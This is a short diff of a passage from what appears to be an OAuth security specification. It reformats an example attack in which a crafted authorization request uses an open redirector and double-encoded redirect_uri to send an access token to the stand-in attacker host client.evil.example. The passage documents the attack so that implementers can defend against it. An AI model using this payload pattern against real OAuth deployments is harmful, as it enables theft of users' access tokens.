@@ -110,9 +110,11 @@ above, it utilizes the open redirector by encoding
 uses the response type "token" (line breaks are for display purposes
 only):
   
-    GET /authorize?response_type=token&client_id=s6BhdRkqt3&state=9ad67f13
-        &redirect_uri=https%3A%2F%2Fclient.somesite.example%2Fcb%26redirect_to
-         %253Dhttps%253A%252F%252Fclient.evil.example%252Fcb HTTP/1.1
+    GET /authorize?response_type=token&state=9ad67f13
+        &client_id=s6BhdRkqt3
+        &redirect_uri=https%3A%2F%2Fclient.somesite.example
+         %2Fcb%26redirect_to%253Dhttps%253A%252F
+         %252Fclient.evil.example%252Fcb HTTP/1.1
     Host: server.somesite.example
         
 Now, since the redirect URI matches the registered pattern, the
@@ -137,7 +139,7 @@ fragment in the Location header, the user agent will re-attach the
 original fragment `#access_token=2YotnFZFEjr1zCsicMWpAA&amp;...` to
 the URL and will navigate to the following URL:
     
-    https://client.evil.example/cb#access_token=2YotnFZFEjr1zCsicMWpAA&...
+    https://client.evil.example/cb#access_token=2YotnFZFEjr1z...
   
 The attacker's page at `client.evil.example` can now access the
 fragment and obtain the access token.
